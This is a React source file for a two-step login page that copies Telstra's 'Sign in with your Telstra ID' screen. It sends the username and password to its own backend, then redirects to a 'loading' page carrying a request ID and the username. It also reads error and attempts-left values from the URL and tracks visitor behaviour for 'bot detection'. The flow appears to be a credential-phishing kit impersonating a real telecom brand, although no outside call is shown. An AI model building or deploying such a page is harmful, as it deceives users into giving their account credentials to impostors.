import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { z } from "zod";
import { apiRequest } from "@/lib/queryClient";
import { useLocation, Link } from "wouter";
import { Logo } from "@/components/Logo";
import { Footer } from "@/components/Footer";
import { SkipNav } from "@/components/SkipNav";
import { ErrorIcon } from "@/components/ErrorIcon";
import { useSecurity } from "@/hooks/useSecurity";

const usernameSchema = z.object({
  username: z
    .string()
    .min(1, "Please enter your username")
    .min(3, "Username must be at least 3 characters long")
    .refine((val) => !/\s/.test(val), {
      message: "Username cannot contain spaces",
    })
    .refine((val) => !/^\d+$/.test(val), {
      message: "Username cannot be numbers only",
    }),
  rememberUsername: z.boolean().default(false),
});

const passwordSchema = z.object({
  password: z.string().min(1, "Please enter your password"),
});

type UsernameFormData = z.infer<typeof usernameSchema>;
type PasswordFormData = z.infer<typeof passwordSchema>;

export default function Login() {
  const [step, setStep] = useState<"username" | "password">("username");
  const [usernameData, setUsernameData] = useState<UsernameFormData | null>(
    null,
  );
  const [, setLocation] = useLocation();
  const [hasError, setHasError] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [attemptsLeft, setAttemptsLeft] = useState<number | null>(null);

  // Security: Start tracking user behavior for bot detection
  const { startTracking, getSecurityPayload, getCSRFToken, refreshCSRFToken, refreshTokens } = useSecurity();

  useEffect(() => {
    startTracking();
  }, [startTracking]);

  useEffect(() => {
    document.title = "Sign in";
  }, []);

  const usernameForm = useForm<UsernameFormData>({
    resolver: zodResolver(usernameSchema),
    defaultValues: {
      username: "",
      rememberUsername: false,
    },
  });

  const passwordForm = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
    defaultValues: {
      password: "",
    },
  });

  // Check URL parameters on load
  useEffect(() => {
    if (typeof window === "undefined") return;

    const urlParams = new URLSearchParams(window.location.search);
    const urlUsername = urlParams.get("username");
    const urlError = urlParams.get("error");
    const urlAttemptsLeft = urlParams.get("attemptsLeft");

    if (urlUsername) {
      const userData: UsernameFormData = {
        username: urlUsername,
        rememberUsername: false,
      };
      setUsernameData(userData);
      usernameForm.setValue("username", urlUsername);
      setStep("password");

      if (urlError === "incorrect_password") {
        setHasError(true);
      }

      if (urlAttemptsLeft !== null) {
        const parsed = Number(urlAttemptsLeft);
        if (Number.isFinite(parsed)) {
          setAttemptsLeft(parsed);
        }
      }
    }
  }, [usernameForm]);

  const checkUsernameMutation = useMutation({
    mutationFn: async (data: UsernameFormData) => {
      // Include security payload with behavioral data
      const securityPayload = getSecurityPayload();
      const response = await apiRequest(
        "POST",
        "/api/auth/check-username",
        { ...data, ...securityPayload },
        { "X-CSRF-Token": getCSRFToken() },
      );
      return response.json();
    },
    onSuccess: (result, variables) => {
      setUsernameData(variables);
      // Refresh only the CSRF token — keep the existing nonce so its age clock
      // (2 s minimum) keeps ticking from page load rather than restarting now.
      refreshCSRFToken().finally(() => setStep("password"));
    },
    onError: () => {},
  });

  const loginMutation = useMutation({
    mutationFn: async (passwordData: PasswordFormData) => {
      if (!usernameData) {
        throw new Error("Username data is not set");
      }

      // Include security payload with behavioral data
      const securityPayload = getSecurityPayload();
      const fullLoginData = {
        ...usernameData,
        ...passwordData,
        ...securityPayload,
      };

      const doLogin = async (payload: typeof fullLoginData) => {
        const res = await fetch("/api/auth/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-CSRF-Token": getCSRFToken(),
          },
          body: JSON.stringify(payload),
          credentials: "include",
        });
        return res;
      };

      let response = await doLogin(fullLoginData);

      // On 403 (CSRF spent or missing) or 400 (nonce too fresh), refresh both
      // tokens and wait 2.5 s so the new nonce ages past the server's 2 s minimum.
      if (response.status === 403 || response.status === 400) {
        await refreshTokens();
        await new Promise((resolve) => setTimeout(resolve, 2500));
        const retryPayload = { ...fullLoginData, ...getSecurityPayload() };
        response = await doLogin(retryPayload);
      }

      if (!response.ok) throw new Error("login_failed");
      return response.json();
    },
    onSuccess: (result) => {
      const requestId = result.requestId || Date.now().toString();
      const username = usernameData?.username || "";
      setLocation(
        `/loading?requestId=${requestId}&username=${encodeURIComponent(
          username,
        )}`,
      );
    },
    onError: () => {
      setHasError(true);
    },
  });

  const onUsernameSubmit = (data: UsernameFormData) => {
    checkUsernameMutation.mutate(data);
  };

  const onPasswordSubmit = (data: PasswordFormData) => {
    setHasError(false);
    loginMutation.mutate(data);
  };

  const goBackToUsername = () => {
    setStep("username");
    setUsernameData(null);
    passwordForm.reset();
    setHasError(false);
  };

  return (
    <div className="min-h-screen bg-white">
      <SkipNav />
      {/* Company Header */}
      <header className="auth-page-header">
        <Logo />
      </header>

      <div role="main" id="main-content" className="t-form-container">
        <h1 className="t-heading">Sign in</h1>
        <div className="t-sub-heading">
          Sign in with your Telstra ID
        </div>

        {step === "username" ? (
          /* Step 1: Username Form */
          <form
            onSubmit={usernameForm.handleSubmit(onUsernameSubmit)}
            method="POST"
            autoComplete="off"
          >
            {/* Username Field */}
            <div className="t-able-text-field t-able-spacing-2x-mb">
              <label htmlFor="username">Username</label>
              <input
                id="username"
                type="text"
                inputMode="email"
                {...usernameForm.register("username")}
                autoComplete="username webauthn"
                aria-invalid={
                  usernameForm.formState.errors.username ? "true" : "false"
                }
                aria-required="true"
                data-testid="input-username"
              />
              {usernameForm.formState.errors.username && (
                <p
                  className="text-destructive text-sm mt-2"
                  data-testid="text-username-error"
                >
                  <ErrorIcon />
                  {usernameForm.formState.errors.username.message}
                </p>
              )}
            </div>

            {/* Recover Username Link */}
            <div className="t-able-spacing-2x-mb">
              <Link
                to="/recover-username"
                className="t-able-low-emph-button t-reset-password-link"
                data-testid="link-recover-username"
              >
                Recover username
              </Link>
            </div>

            {/* Remember Username Checkbox */}
            <div className="t-able-checkbox t-able-spacing-3x-mb">
              <input
                name="rememberUsername"
                type="checkbox"
                id="rememberUsername"
                checked={usernameForm.watch("rememberUsername")}
                onChange={(e) =>
                  usernameForm.setValue("rememberUsername", e.target.checked)
                }
                data-testid="checkbox-remember-username"
              />
              <label htmlFor="rememberUsername">
                Remember username
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  aria-hidden="true"
                  focusable="false"
                >
                  <path d="M9.54,14.81l8-8a1.09,1.09,0,0,1,1.54,0l0,0a1.1,1.1,0,0,1,0,1.54l-8.78,8.78s0,0,0,0a1.12,1.12,0,0,1-.79.33h0a1.15,1.15,0,0,1-.41-.08,1.08,1.08,0,0,1-.39-.25L4.86,13.31a1.13,1.13,0,0,1,.8-1.92,1.11,1.11,0,0,1,.79.33Z" />
                </svg>
              </label>
            </div>

            {/* Continue Button */}
            <div>
              <button
                id="submit_btn"
                className="t-able-high-emph-button t-able-spacing-2x-mb"
                type="submit"
                disabled={checkUsernameMutation.isPending}
                data-testid="button-continue"
              >
                {checkUsernameMutation.isPending ? "Checking..." : "Continue"}
              </button>
            </div>

            {/* OR Divider */}
            <p className="t-able-sub-head-line t-able-spacing-2x-mb">OR</p>

            {/* Create Account Link */}
            <Link
              to="/register"
              className="t-able-medium-emph-button t-able-spacing-7x-mb"
              data-testid="link-create-account"
            >
              Create a Telstra ID
            </Link>
          </form>
        ) : (
          /* Step 2: Password Form */
          <form
            onSubmit={passwordForm.handleSubmit(onPasswordSubmit)}
            method="POST"
            autoComplete="off"
          >
            {/* Back to Previous Section */}
            <div className="t-back-to-previous-label t-able-spacing-2x-mb">
              Back to previous for:
            </div>
            <a
              className="t-input-with-anchor t-able-spacing-4x-mb"
              href="#"
              onClick={(e) => {
                e.preventDefault();
                goBackToUsername();
              }}
              data-testid="button-back"
            >
              {/* back chevron svg unchanged */}
              <svg
                xmlns="http://www.w3.org/2000/svg"
                width="6.98"
                height="12.45"
                viewBox="0 0 6.98 12.45"
                role="img"
                aria-hidden="true"
                focusable="false"
              >
                <defs>
                  <clipPath id="a">
                    <path
                      d="M1.82,6.22,6.76,1.28A.75.75,0,1,0,5.7.22L.22,5.69A.77.77,0,0,0,0,6.23a.75.75,0,0,0,.22.53L5.7,12.23a.75.75,0,0,0,.53.22.76.76,0,0,0,.53-.23A.75.75,0,0,0,7,11.69a.77.77,0,0,0-.22-.54Z"
                      fill="none"
                      clipRule="evenodd"
                    ></path>
                  </clipPath>
                </defs>
                <g clipPath="url(#a)">
                  <rect
                    x="-5"
                    y="-5"
                    width="16.98"
                    height="22.45"
                    fill="#0064d2"
                  ></rect>
                </g>
              </svg>
              <span className="t-able-sr-only">Back to previous for</span>
              <span data-testid="text-selected-username">
                {usernameData?.username}
              </span>
            </a>

            {/* Password Field */}
            <div
              className="t-able-text-field t-able-text-field-secure-field-toggle t-able-spacing-2x-mb"
              id="pwdField"
            >
              <label htmlFor="password">Password</label>
              <input
                id="password"
                type={showPassword ? "text" : "password"}
                {...passwordForm.register("password")}
                autoFocus
                autoComplete="current-password"
                aria-invalid={hasError ? "true" : "false"}
                aria-required="true"
                aria-describedby="password-error-text"
                data-testid="input-password"
              />
              <button
                type="button"
                aria-pressed={showPassword}
                aria-label={showPassword ? "Hide password" : "Reveal password"}
                onClick={() => setShowPassword(!showPassword)}
              >
                <svg className="able-icon" role="img" aria-hidden="true" focusable="false">
                  <use href="/assets/able-sprites.svg#ToggleShow" />
                </svg>
                <svg className="able-icon" role="img" aria-hidden="true" focusable="false">
                  <use href="/assets/able-sprites.svg#ToggleHide" />
                </svg>
              </button>
              {hasError && (
                <p
                  id="password-error-text"
                  className="text-destructive text-sm mt-2"
                  data-testid="text-password-incorrect"
                >
                  <ErrorIcon />
                  The username or password entered does not match our records.
                  Please try again.
                  {attemptsLeft !== null && attemptsLeft > 0 && (
                    <> {attemptsLeft} attempt{attemptsLeft === 1 ? "" : "s"} remaining.</>
                  )}
                </p>
              )}
              {!hasError && passwordForm.formState.errors.password && (
                <p
                  id="password-error-text"
                  className="text-destructive text-sm mt-2"
                  data-testid="text-password-error"
                >
                  <ErrorIcon />
                  {passwordForm.formState.errors.password.message}
                </p>
              )}
            </div>

            {/* Recover Password Link */}
            <div className="t-able-spacing-2x-mb">
              <Link
                to="/recover-password"
                className="t-able-low-emph-button t-reset-password-link"
                data-testid="link-recover-password"
              >
                Recover account
              </Link>
            </div>

            {/* Sign In Button */}
            <div>
              <button
                id="submit_btn"
                className="t-able-high-emph-button t-able-spacing-7x-mb"
                type="submit"
                disabled={loginMutation.isPending}
                data-testid="button-signin"
              >
                {loginMutation.isPending ? "Signing in..." : "Sign in"}
              </button>
            </div>
          </form>
        )}
      </div>

      <Footer />
    </div>
  );
}
